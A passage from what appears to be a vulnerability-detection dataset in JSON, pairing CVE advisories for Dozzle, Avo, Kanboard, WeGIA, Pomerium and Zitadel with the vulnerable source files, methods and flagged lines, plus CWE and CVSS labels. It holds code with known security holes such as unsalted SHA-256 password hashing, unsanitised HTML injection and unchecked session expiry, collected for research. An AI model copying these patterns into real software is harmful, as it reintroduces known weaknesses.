          "content": "\t\t\t// limit the reader on each file read to prevent decompression bomb attacks"
        },
        {
          "line_no": 147,
          "content": "\t\t\tnumBytes, err := io.Copy(f, io.LimitReader(entry.Reader, perFileReadLimit))"
        },
        {
          "line_no": 148,
          "content": "\t\t\tif numBytes >= perFileReadLimit || errors.Is(err, io.EOF) {"
        },
        {
          "line_no": 149,
          "content": "\t\t\t\treturn fmt.Errorf(\"zip read limit hit (potential decompression bomb attack)\")"
        },
        {
          "line_no": 150,
          "content": "\t\t\t}"
        },
        {
          "line_no": 151,
          "content": "\t\t\tif err != nil {"
        },
        {
          "line_no": 152,
          "content": "\t\t\t\treturn fmt.Errorf(\"unable to copy file: %w\", err)"
        },
        {
          "line_no": 153,
          "content": "\t\t\t}"
        },
        {
          "line_no": 155,
          "content": "\t\t\tif err = f.Close(); err != nil {"
        },
        {
          "line_no": 156,
          "content": "\t\t\t\tlog.Errorf(\"failed to close file during untar of path=%q: %w\", f.Name(), err)"
        },
        {
          "line_no": 157,
          "content": "\t\t\t}"
        },
        {
          "line_no": 159,
          "content": "\t\treturn nil"
        },
        {
          "line_no": 160,
          "content": "\t}"
        },
        {
          "line_no": 162,
          "content": "\treturn IterateTar(reader, visitor)"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 1204,
    "cve": "CVE-2024-47182",
    "description": "Dozzle is a realtime log viewer for docker containers. Before version 8.5.3, the app uses sha-256 as the hash for passwords, which leaves users susceptible to rainbow table attacks. The app switches to bcrypt, a more appropriate hash for passwords, in version 8.5.3.",
    "vulnerability": {
      "file_level": [
        {
          "name": "internal/auth/users.go",
          "content": "package auth\n\nimport (\n\t\"bytes\"\n\t\"context\"\n\t\"crypto/sha256\"\n\t\"encoding/hex\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"net/url\"\n\t\"os\"\n\t\"time\"\n\n\t\"github.com/go-chi/jwtauth/v5\"\n\t\"github.com/rs/zerolog/log\"\n\t\"gopkg.in/yaml.v3\"\n)\n\ntype User struct {\n\tUsername string `json:\"username\" yaml:\"-\"`\n\tEmail    string `json:\"email\" yaml:\"email\"`\n\tName     string `json:\"name\" yaml:\"name\"`\n\tPassword string `json:\"-\" yaml:\"password\"`\n}\n\nfunc (u User) AvatarURL() string {\n\tname := u.Name\n\tif name == \"\" {\n\t\tname = u.Username\n\t}\n\treturn fmt.Sprintf(\"https://gravatar.com/avatar/%s?d=https%%3A%%2F%%2Fui-avatars.com%%2Fapi%%2F/%s/128\", hashEmail(u.Email), url.QueryEscape(name))\n}\n\nfunc newUser(username, email, name string) User {\n\treturn User{\n\t\tUsername: username,\n\t\tEmail:    email,\n\t\tName:     name,\n\t}\n}\n\ntype UserDatabase struct {\n\tUsers    map[string]*User `yaml:\"users\"`\n\tLastRead time.Time        `yaml:\"-\"`\n\tPath     string           `yaml:\"-\"`\n}\n\nfunc ReadUsersFromFile(path string) (UserDatabase, error) {\n\tusers, err := decodeUsersFromFile(path)\n\tif err != nil {\n\t\treturn users, err\n\t}\n\n\tusers.LastRead = time.Now()\n\tusers.Path = path\n\n\treturn users, nil\n}\n\nfunc GenerateUsers(user User, hashPassword bool) *bytes.Buffer {\n\tbuffer := &bytes.Buffer{}\n\n\tif hashPassword {\n\t\tuser.Password = sha256sum(user.Password)\n\t}\n\n\tusers := UserDatabase{\n\t\tUsers: map[string]*User{\n\t\t\tuser.Username: &user,\n\t\t},\n\t}\n\n\tyaml.NewEncoder(buffer).Encode(users)\n\n\treturn buffer\n}\n\nfunc decodeUsersFromFile(path string) (UserDatabase, error) {\n\tusers := UserDatabase{}\n\tfile, err := os.Open(path)\n\tif err != nil {\n\t\treturn users, err\n\t}\n\tdefer file.Close()\n\n\tif err := yaml.NewDecoder(file).Decode(&users); err != nil {\n\t\treturn users, err\n\t}\n\n\tfor username, user := range users.Users {\n\t\tuser.Username = username\n\t\tif user.Password == \"\" {\n\t\t\tlog.Fatal().Msgf(\"User %s has an empty password\", username)\n\t\t}\n\n\t\tif len(user.Password) != 64 {\n\t\t\tlog.Fatal().Str(\"password\", user.Password).Msgf(\"User %s has an invalid password hash\", username)\n\t\t}\n\n\t\tif user.Name == \"\" {\n\t\t\tuser.Name = username\n\t\t}\n\t}\n\n\treturn users, nil\n}\n\nfunc (u *UserDatabase) readFileIfChanged() error {\n\tif u.Path == \"\" {\n\t\treturn nil\n\t}\n\tinfo, err := os.Stat(u.Path)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tif info.ModTime().After(u.LastRead) {\n\t\tlog.Info().Msg(\"Reloading user database\")\n\t\tusers, err := decodeUsersFromFile(u.Path)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tu.Users = users.Users\n\t\tu.LastRead = time.Now()\n\t}\n\n\treturn nil\n}\n\nfunc (u *UserDatabase) Find(username string) *User {\n\tif err := u.readFileIfChanged(); err != nil {\n\t\tlog.Error().Err(err).Msg(\"Failed to read user database\")\n\t\treturn nil\n\t}\n\tuser, ok := u.Users[username]\n\tif !ok {\n\t\treturn nil\n\t}\n\treturn user\n}\n\nfunc (u *UserDatabase) FindByPassword(username, password string) *User {\n\tuser := u.Find(username)\n\n\tif user == nil {\n\t\treturn nil\n\t}\n\n\tif user.Password != sha256sum(password) {\n\t\treturn nil\n\t}\n\treturn user\n}\n\nfunc sha256sum(s string) string {\n\tbytes := sha256.Sum256([]byte(s))\n\treturn hex.EncodeToString(bytes[:])\n}\n\nfunc UserFromContext(ctx context.Context) *User {\n\tif user, ok := ctx.Value(remoteUser).(User); ok {\n\t\treturn &user\n\t} else {\n\t\tif _, claims, err := jwtauth.FromContext(ctx); err == nil {\n\t\t\tusername, ok := claims[\"username\"].(string)\n\t\t\tif !ok {\n\t\t\t\treturn nil\n\t\t\t}\n\t\t\tif username == \"\" {\n\t\t\t\treturn nil\n\t\t\t}\n\t\t\temail := claims[\"email\"].(string)\n\t\t\tname := claims[\"name\"].(string)\n\t\t\tuser := newUser(username, email, name)\n\t\t\treturn &user\n\t\t}\n\t\treturn nil\n\t}\n}\n\nfunc RequireAuthentication(next http.Handler) http.Handler {\n\treturn http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\tuser := UserFromContext(r.Context())\n\t\tif user != nil {\n\t\t\tnext.ServeHTTP(w, r)\n\t\t} else {\n\t\t\thttp.Error(w, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)\n\t\t}\n\t})\n}\n"
        }
      ],
      "method_level": [
        "func GenerateUsers(user User, hashPassword bool) *bytes.Buffer {\n\tbuffer := &bytes.Buffer{}\n\n\tif hashPassword {\n\t\tuser.Password = sha256sum(user.Password)\n\t}\n\n\tusers := UserDatabase{\n\t\tUsers: map[string]*User{\n\t\t\tuser.Username: &user,\n\t\t},\n\t}\n\n\tyaml.NewEncoder(buffer).Encode(users)\n\n\treturn buffer\n}",
        "func decodeUsersFromFile(path string) (UserDatabase, error) {\n\tusers := UserDatabase{}\n\tfile, err := os.Open(path)\n\tif err != nil {\n\t\treturn users, err\n\t}\n\tdefer file.Close()\n\n\tif err := yaml.NewDecoder(file).Decode(&users); err != nil {\n\t\treturn users, err\n\t}\n\n\tfor username, user := range users.Users {\n\t\tuser.Username = username\n\t\tif user.Password == \"\" {\n\t\t\tlog.Fatal().Msgf(\"User %s has an empty password\", username)\n\t\t}\n\n\t\tif len(user.Password) != 64 {\n\t\t\tlog.Fatal().Str(\"password\", user.Password).Msgf(\"User %s has an invalid password hash\", username)\n\t\t}\n\n\t\tif user.Name == \"\" {\n\t\t\tuser.Name = username\n\t\t}\n\t}\n\n\treturn users, nil\n}",
        "func (u *UserDatabase) FindByPassword(username, password string) *User {\n\tuser := u.Find(username)\n\n\tif user == nil {\n\t\treturn nil\n\t}\n\n\tif user.Password != sha256sum(password) {\n\t\treturn nil\n\t}\n\treturn user\n}"
      ],
      "hunk_level": [
        {
          "line_no": 64,
          "content": "\t\tuser.Password = sha256sum(user.Password)"
        },
        {
          "line_no": 96,
          "content": "\t\tif len(user.Password) != 64 {"
        },
        {
          "line_no": 97,
          "content": "\t\t\tlog.Fatal().Str(\"password\", user.Password).Msgf(\"User %s has an invalid password hash\", username)"
        },
        {
          "line_no": 149,
          "content": "\tif user.Password != sha256sum(password) {"
        }
      ]
    },
    "cwe": [
      "CWE-328",
      "CWE-326"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.8,
    "cvss_version": 3.1
  },
  {
    "id": 90,
    "cve": "CVE-2024-22411",
    "description": "Avo is a framework to create admin panels for Ruby on Rails apps. In Avo 3 pre12, any HTML inside text that is passed to `error` or `succeed` in an `Avo::BaseAction` subclass will be rendered directly without sanitization in the toast/notification that appears in the UI on Action completion. A malicious user could exploit this vulnerability to trigger a cross site scripting attack on an unsuspecting user. This issue has been addressed in the 3.3.0 and 2.47.0 releases of Avo. Users are advised to upgrade.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/javascript/js/controllers/fields/key_value_controller.js",
          "content": "/* eslint-disable max-len */\nimport { Controller } from '@hotwired/stimulus'\nimport { castBoolean } from '../../helpers/cast_boolean'\n\nexport default class extends Controller {\n  static targets = ['input', 'controller', 'rows']\n\n  fieldValue = []\n\n  options = {}\n\n  get keyInputDisabled() {\n    return !this.options.editable || this.options.disable_editing_keys\n  }\n\n  get valueInputDisabled() {\n    return !this.options.editable\n  }\n\n  connect() {\n    this.setOptions()\n\n    try {\n      const objectValue = JSON.parse(this.inputTarget.value)\n      Object.keys(objectValue).forEach((key) => this.fieldValue.push([key, objectValue[key]]))\n    } catch (error) {\n      this.fieldValue = []\n    }\n\n    this.updateKeyValueComponent()\n  }\n\n  addRow() {\n    if (this.options.disable_adding_rows || !this.options.editable) return\n    this.fieldValue.push(['', ''])\n    this.updateKeyValueComponent()\n    this.focusLastRow()\n  }\n\n  deleteRow(event) {\n    if (this.options.disable_deleting_rows || !this.options.editable) return\n    const { index } = event.params\n    this.fieldValue.splice(index, 1)\n    this.updateTextareaInput()\n    this.updateKeyValueComponent()\n  }\n\n  focusLastRow() {\n    return this.rowsTarget.querySelector('.flex.key-value-row:last-child .key-value-input-key').focus()\n  }\n\n  valueFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][1] = value\n\n    this.updateTextareaInput()\n  }\n\n  keyFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][0] = value\n\n    this.updateTextareaInput()\n  }\n\n  updateTextareaInput() {\n    if (!this.hasInputTarget) return\n    let result = {}\n    if (this.fieldValue && this.fieldValue.length > 0) {\n      result = Object.assign(...this.fieldValue.map(([key, val]) => ({ [key]: val })))\n    }\n    this.inputTarget.innerText = JSON.stringify(result)\n    this.inputTarget.dispatchEvent(new Event('input'))\n  }\n\n  updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }\n\n  interpolatedRow(key, value, index) {\n    let result = `<div class=\"flex key-value-row\">\n      ${this.inputField('key', index, key, value)}\n      ${this.inputField('value', index, key, value)}`\n    if (this.options.editable) {\n      result += `<a\n  href=\"javascript:void(0);\"\n  data-key-value-index-param=\"${index}\"\n  data-action=\"click->key-value#deleteRow\"\n  title=\"${this.options.delete_text}\"\n  data-tippy=\"tooltip\"\n  data-button=\"delete-row\"\n  tabindex=\"-1\"\n  ${this.options.disable_deleting_rows ? \"disabled='disabled'\" : ''}\n  class=\"flex items-center justify-center p-2 px-3 border-none ${this.options.disable_deleting_rows ? 'cursor-not-allowed' : ''}\"\n><svg class=\"pointer-events-none text-gray-500 h-5 hover:text-gray-500\" fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" viewBox=\"0 0 24 24\" stroke=\"currentColor\"><path d=\"M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16\"></path></svg></a>`\n    }\n    result += '</div>'\n\n    return result\n  }\n\n  inputField(id = 'key', index, key, value) {\n    const inputValue = id === 'key' ? key : value\n\n    return `<input\n  class=\"${this.options.inputClasses} focus:bg-gray-100 !rounded-none border-gray-600 border-r border-l-0 border-b-0 border-t-0 focus:border-gray-300 w-1/2 focus:outline-none outline-none key-value-input-${id}\"\n  data-action=\"input->key-value#${id}FieldUpdated\"\n  placeholder=\"${this.options[`${id}_label`]}\"\n  data-index=\"${index}\"\n  ${this[`${id}InputDisabled`] ? \"disabled='disabled'\" : ''}\n  value=\"${typeof inputValue === 'undefined' || inputValue === null ? '' : inputValue}\"\n/>`\n  }\n\n  setOptions() {\n    let fieldOptions\n\n    try {\n      fieldOptions = JSON.parse(this.controllerTarget.dataset.options)\n    } catch (error) {\n      fieldOptions = {}\n    }\n    this.options = {\n      ...fieldOptions,\n      inputClasses: this.controllerTarget.dataset.inputClasses,\n      editable: castBoolean(this.controllerTarget.dataset.editable),\n    }\n  }\n}\n"
        }
      ],
      "method_level": [
        "updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 83,
          "content": "      result += this.interpolatedRow(key, value, index)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 1339,
    "cve": "CVE-2024-55603",
    "description": "Kanboard is project management software that focuses on the Kanban methodology. In affected versions sessions are still usable even though their lifetime has exceeded. Kanboard implements a cutom session handler (`app/Core/Session/SessionHandler.php`), to store the session data in a database. Therefore, when a `session_id` is given, kanboard queries the data from the `sessions` sql table. At this point, it does not correctly verify, if a given `session_id` has already exceeded its lifetime (`expires_at`).\nThus, a session which's lifetime is already `> time()`, is still queried from the database and hence a valid login. The implemented **SessionHandlerInterface::gc** function, that does remove invalid sessions, is called only **with a certain probability** (_Cleans up expired sessions. Called by `session_start()`, based on `session.gc_divisor`, `session.gc_probability` and `session.gc_maxlifetime` settings_) accordingly to the php documentation. In the official Kanboard docker image these values default to: session.gc_probability=1, session.gc_divisor=1000. Thus, an expired session is only terminated with probability 1/1000. This issue has been addressed in release 1.2.43 and all users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/Core/Session/SessionHandler.php",
          "content": "<?php\n\nnamespace Kanboard\\Core\\Session;\n\nuse PicoDb\\Database;\nuse SessionHandlerInterface;\n\n/**\n * Class SessionHandler\n *\n * @package Kanboard\\Core\\Session\n */\nclass SessionHandler implements SessionHandlerInterface\n{\n    const TABLE = 'sessions';\n\n    /**\n     * @var Database\n     */\n    private $db;\n\n    public function __construct(Database $db)\n    {\n        $this->db = $db;\n    }\n\n    #[\\ReturnTypeWillChange]\n    public function close()\n    {\n        return true;\n    }\n\n    #[\\ReturnTypeWillChange]\n    public function destroy($sessionID)\n    {\n        return $this->db->table(self::TABLE)->eq('id', $sessionID)->remove();\n    }\n\n    #[\\ReturnTypeWillChange]\n    public function gc($maxlifetime)\n    {\n        return $this->db->table(self::TABLE)->lt('expire_at', time())->remove();\n    }\n\n    #[\\ReturnTypeWillChange]\n    public function open($savePath, $name)\n    {\n        return true;\n    }\n\n    #[\\ReturnTypeWillChange]\n    public function read($sessionID)\n    {\n        $result = $this->db->table(self::TABLE)->eq('id', $sessionID)->findOneColumn('data');\n        return $result ?: '';\n    }\n\n    #[\\ReturnTypeWillChange]\n    public function write($sessionID, $data)\n    {\n        if (SESSION_DURATION > 0) {\n            $lifetime = time() + SESSION_DURATION;\n        } else {\n            $lifetime = time() + (ini_get('session.gc_maxlifetime') ?: 1440);\n        }\n\n        $this->db->startTransaction();\n\n        if ($this->db->table(self::TABLE)->eq('id', $sessionID)->exists()) {\n            $this->db->table(self::TABLE)->eq('id', $sessionID)->update([\n                'expire_at' => $lifetime,\n                'data'      => $data,\n            ]);\n        } else {\n            $this->db->table(self::TABLE)->insert([\n                'id'        => $sessionID,\n                'expire_at' => $lifetime,\n                'data'      => $data,\n            ]);\n        }\n\n        $this->db->closeTransaction();\n\n        return true;\n    }\n}\n"
        }
      ],
      "method_level": [
        "#[\\ReturnTypeWillChange]\n    public function read($sessionID)\n    {\n        $result = $this->db->table(self::TABLE)->eq('id', $sessionID)->findOneColumn('data');\n        return $result ?: '';\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 54,
          "content": "        $result = $this->db->table(self::TABLE)->eq('id', $sessionID)->findOneColumn('data');"
        }
      ]
    },
    "cwe": [
      "CWE-613"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 6,
    "cve": "CVE-2025-23032",
    "description": "WeGIA is an open source web manager with a focus on the Portuguese language and charitable institutions. A Stored Cross-Site Scripting (XSS) vulnerability was identified in the `adicionar_escala.php` endpoint of the WeGIA application. This vulnerability allows attackers to inject malicious scripts into the `escala` parameter. The injected scripts are stored on the server and executed automatically whenever the affected page is accessed by users, posing a significant security risk. The application fails to properly validate and sanitize user inputs in the `adicionar_escala.php` parameter. This lack of validation allows attackers to inject malicious scripts, which are then stored on the server. Whenever the affected page is accessed, the malicious payload is executed in the victim's browser, potentially compromising the user's data and system. This issue has been addressed in version 3.2.6. All users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "controle/QuadroHorarioControle.php",
          "content": "<?php\ninclude_once '../dao/QuadroHorarioDAO.php';\n\nclass QuadroHorarioControle\n{\n    // Tipos\n\n    public function listarTipo(){\n        extract($_REQUEST);\n        (new QuadroHorarioDAO())->listarTipos();\n        header(\"Location: $nextPage\");\n    }\n\n    public function adicionarTipo(){\n        extract($_REQUEST);\n        session_start();\n        try {\n            $log = (new QuadroHorarioDAO())->adicionarTipo($tipo);;\n            $_SESSION['msg'] = $log;\n        } catch (PDOException $e) {\n            echo(\"Erro ao adicionar tipo '$tipo' ao banco de dados: \" . $e->getMessage());\n            $_SESSION['msg'] = \"Erro ao adicionar tipo: \" . $e->getMessage();\n            $_SESSION['flag'] = \"erro\";\n        }\n        $_SESSION['btnVoltar'] = true;\n        header(\"Location: $nextPage\");\n    }\n\n    public function removerTipo(){\n        extract($_REQUEST);\n        $log = (new QuadroHorarioDAO)->removerTipo($id);\n        session_start();\n        $_SESSION['msg'] = $log;\n        header(\"Location: $nextPage\");\n    }\n\n    // Escalas\n\n    public function listarEscala(){\n        extract($_REQUEST);\n        (new QuadroHorarioDAO())->listarEscalas();\n        header(\"Location: $nextPage\");\n    }\n\n    public function adicionarEscala(){\n        extract($_REQUEST);\n        session_start();\n        try {\n            $log = (new QuadroHorarioDAO())->adicionarEscala($escala);\n            $_SESSION['msg'] = $log;\n        } catch (PDOException $e) {\n            echo(\"Erro ao adicionar escala '$escala' ao banco de dados: \" . $e->getMessage());\n            $_SESSION['msg'] = \"Erro ao adicionar escala: \" . $e->getMessage();\n            $_SESSION['flag'] = \"erro\";\n        }\n        $_SESSION['btnVoltar'] = true;\n        header(\"Location: $nextPage\");\n    }\n\n    public function removerEscala(){\n        extract($_REQUEST);\n        $log = (new QuadroHorarioDAO)->removerEscala($id);\n        session_start();\n        $_SESSION['msg'] = $log;\n        header(\"Location: $nextPage\");\n    }\n}"
        }
      ],
      "method_level": [
        "public function adicionarEscala(){\n        extract($_REQUEST);\n        session_start();\n        try {\n            $log = (new QuadroHorarioDAO())->adicionarEscala($escala);\n            $_SESSION['msg'] = $log;\n        } catch (PDOException $e) {\n            echo(\"Erro ao adicionar escala '$escala' ao banco de dados: \" . $e->getMessage());\n            $_SESSION['msg'] = \"Erro ao adicionar escala: \" . $e->getMessage();\n            $_SESSION['flag'] = \"erro\";\n        }\n        $_SESSION['btnVoltar'] = true;\n        header(\"Location: $nextPage\");\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 46,
          "content": "        extract($_REQUEST);"
        },
        {
          "line_no": 57,
          "content": "        header(\"Location: $nextPage\");"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.4,
    "cvss_version": 4.0
  },
  {
    "id": 910,
    "cve": "CVE-2024-39315",
    "description": "Pomerium is an identity and context-aware access proxy. Prior to version 0.26.1, the Pomerium user info page (at `/.pomerium`) unintentionally included serialized OAuth2 access and ID tokens from the logged-in user's session. These tokens are not intended to be exposed to end users. This issue may be more severe in the presence of a cross-site scripting vulnerability in an upstream application proxied through Pomerium. If an attacker could insert a malicious script onto a web page proxied through Pomerium, that script could access these tokens by making a request to the `/.pomerium` endpoint. Upstream applications that authenticate only the ID token may be vulnerable to user impersonation using a token obtained in this manner. Note that an OAuth2 access token or ID token by itself is not sufficient to hijack a user's Pomerium session. Upstream applications should not be vulnerable to user impersonation via these tokens provided the application verifies the Pomerium JWT for each request, the connection between Pomerium and the application is secured by mTLS, or the connection between Pomerium and the application is otherwise secured at the network layer. The issue is patched in Pomerium v0.26.1. No known workarounds are available.",
    "vulnerability": {
      "file_level": [
        {
          "name": "internal/handlers/userinfo.go",
          "content": "package handlers\n\nimport (\n\t\"encoding/json\"\n\t\"net/http\"\n\n\t\"google.golang.org/protobuf/encoding/protojson\"\n\n\t\"github.com/pomerium/datasource/pkg/directory\"\n\t\"github.com/pomerium/pomerium/internal/httputil\"\n\t\"github.com/pomerium/pomerium/pkg/grpc/identity\"\n\t\"github.com/pomerium/pomerium/pkg/grpc/session\"\n\t\"github.com/pomerium/pomerium/pkg/grpc/user\"\n\t\"github.com/pomerium/pomerium/ui\"\n\t\"github.com/pomerium/webauthn\"\n)\n\n// UserInfoData is the data for the UserInfo page.\ntype UserInfoData struct {\n\tCSRFToken      string\n\tIsImpersonated bool\n\tSession        *session.Session\n\tUser           *user.User\n\tProfile        *identity.Profile\n\n\tIsEnterprise    bool\n\tDirectoryUser   *directory.User\n\tDirectoryGroups []*directory.Group\n\n\tWebAuthnCreationOptions *webauthn.PublicKeyCredentialCreationOptions\n\tWebAuthnRequestOptions  *webauthn.PublicKeyCredentialRequestOptions\n\tWebAuthnURL             string\n\n\tBrandingOptions httputil.BrandingOptions\n}\n\n// ToJSON converts the data into a JSON map.\nfunc (data UserInfoData) ToJSON() map[string]any {\n\tm := map[string]any{}\n\tm[\"csrfToken\"] = data.CSRFToken\n\tm[\"isImpersonated\"] = data.IsImpersonated\n\tif bs, err := protojson.Marshal(data.Session); err == nil {\n\t\tm[\"session\"] = json.RawMessage(bs)\n\t}\n\tif bs, err := protojson.Marshal(data.User); err == nil {\n\t\tm[\"user\"] = json.RawMessage(bs)\n\t}\n\tif bs, err := protojson.Marshal(data.Profile); err == nil {\n\t\tm[\"profile\"] = json.RawMessage(bs)\n\t}\n\tm[\"isEnterprise\"] = data.IsEnterprise\n\tif data.DirectoryUser != nil {\n\t\tm[\"directoryUser\"] = data.DirectoryUser\n\t}\n\tif len(data.DirectoryGroups) > 0 {\n\t\tm[\"directoryGroups\"] = data.DirectoryGroups\n\t}\n\tm[\"webAuthnCreationOptions\"] = data.WebAuthnCreationOptions\n\tm[\"webAuthnRequestOptions\"] = data.WebAuthnRequestOptions\n\tm[\"webAuthnUrl\"] = data.WebAuthnURL\n\thttputil.AddBrandingOptionsToMap(m, data.BrandingOptions)\n\treturn m\n}\n\n// UserInfo returns a handler that renders the user info page.\nfunc UserInfo(data UserInfoData) http.Handler {\n\treturn httputil.HandlerFunc(func(w http.ResponseWriter, r *http.Request) error {\n\t\treturn ui.ServePage(w, r, \"UserInfo\", \"User Info Dashboard\", data.ToJSON())\n\t})\n}\n"
        }
      ],
      "method_level": [
        "func (data UserInfoData) ToJSON() map[string]any {\n\tm := map[string]any{}\n\tm[\"csrfToken\"] = data.CSRFToken\n\tm[\"isImpersonated\"] = data.IsImpersonated\n\tif bs, err := protojson.Marshal(data.Session); err == nil {\n\t\tm[\"session\"] = json.RawMessage(bs)\n\t}\n\tif bs, err := protojson.Marshal(data.User); err == nil {\n\t\tm[\"user\"] = json.RawMessage(bs)\n\t}\n\tif bs, err := protojson.Marshal(data.Profile); err == nil {\n\t\tm[\"profile\"] = json.RawMessage(bs)\n\t}\n\tm[\"isEnterprise\"] = data.IsEnterprise\n\tif data.DirectoryUser != nil {\n\t\tm[\"directoryUser\"] = data.DirectoryUser\n\t}\n\tif len(data.DirectoryGroups) > 0 {\n\t\tm[\"directoryGroups\"] = data.DirectoryGroups\n\t}\n\tm[\"webAuthnCreationOptions\"] = data.WebAuthnCreationOptions\n\tm[\"webAuthnRequestOptions\"] = data.WebAuthnRequestOptions\n\tm[\"webAuthnUrl\"] = data.WebAuthnURL\n\thttputil.AddBrandingOptionsToMap(m, data.BrandingOptions)\n\treturn m\n}"
      ],
      "hunk_level": [
        {
          "line_no": 42,
          "content": "\tif bs, err := protojson.Marshal(data.Session); err == nil {"
        },
        {
          "line_no": 43,
          "content": "\t\tm[\"session\"] = json.RawMessage(bs)"
        },
        {
          "line_no": 44,
          "content": "\t}"
        },
        {
          "line_no": 45,
          "content": "\tif bs, err := protojson.Marshal(data.User); err == nil {"
        },
        {
          "line_no": 46,
          "content": "\t\tm[\"user\"] = json.RawMessage(bs)"
        },
        {
          "line_no": 47,
          "content": "\t}"
        },
        {
          "line_no": 48,
          "content": "\tif bs, err := protojson.Marshal(data.Profile); err == nil {"
        },
        {
          "line_no": 49,
          "content": "\t\tm[\"profile\"] = json.RawMessage(bs)"
        },
        {
          "line_no": 50,
          "content": "\t}"
        }
      ]
    },
    "cwe": [
      "CWE-201"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.7,
    "cvss_version": 3.1
  },
  {
    "id": 1034,
    "cve": "CVE-2024-41953",
    "description": "Zitadel is an open source identity management system. ZITADEL uses HTML for emails and renders certain information such as usernames dynamically. That information can be entered by users or administrators. Due to a missing output sanitization, these emails could include malicious code. This may potentially lead to a threat where an attacker, without privileges, could send out altered notifications that are part of the registration processes. An attacker could create a malicious link, where the injected code would be rendered as part of the email. On the user's detail page, the username was also not sanitized and would also render HTML, giving an attacker the same vulnerability. While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by most email clients and the Content Security Policy in Console UI. This vulnerability is fixed in 2.58.1, 2.57.1, 2.56.2, 2.55.5, 2.54.8 2.53.9, and 2.52.3.",
    "vulnerability": {
      "file_level": [
        {
          "name": "internal/notification/templates/templateData.go",
          "content": "package templates\n\nimport (\n\t\"fmt\"\n\t\"html\"\n\n\t\"github.com/zitadel/zitadel/internal/domain\"\n\t\"github.com/zitadel/zitadel/internal/i18n\"\n)\n\nconst (\n\tDefaultFontFamily      = \"-apple-system, BlinkMacSystemFont, Segoe UI, Lato, Arial, Helvetica, sans-serif\"\n\tDefaultFontColor       = \"#22292f\"\n\tDefaultBackgroundColor = \"#fafafa\"\n\tDefaultPrimaryColor    = \"#5282C1\"\n)\n\ntype TemplateData struct {\n\tTitle           string\n\tPreHeader       string\n\tSubject         string\n\tGreeting        string\n\tText            string\n\tURL             string\n\tButtonText      string\n\tPrimaryColor    string\n\tBackgroundColor string\n\tFontColor       string\n\tLogoURL         string\n\tFontURL         string\n\tFontFaceFamily  string\n\tFontFamily      string\n\n\tIncludeFooter bool\n\tFooterText    string\n}\n\nfunc (data *TemplateData) Translate(translator *i18n.Translator, msgType string, args map[string]interface{}, langs ...string) {\n\tdata.Title = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageTitle), args, langs...)\n\tdata.PreHeader = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessagePreHeader), args, langs...)\n\tdata.Subject = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageSubject), args, langs...)\n\tdata.Greeting = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageGreeting), args, langs...)\n\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))\n\tdata.ButtonText = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageButtonText), args, langs...)\n\t// Footer text is neither included in i18n files nor defaults.yaml\n\tfooterText := fmt.Sprintf(\"%s.%s\", msgType, domain.MessageFooterText)\n\tdata.FooterText = translator.Localize(footerText, args, langs...)\n\t// translator returns the id of the string to be translated if no translation is found for that id\n\t// we'll include the footer if we have a custom non-empty string and if the string doesn't include the\n\t// id of the string that could not be translated example InitCode.Footer\n\tdata.IncludeFooter = len(data.FooterText) > 0 && data.FooterText != footerText\n}\n"
        }
      ],
      "method_level": [
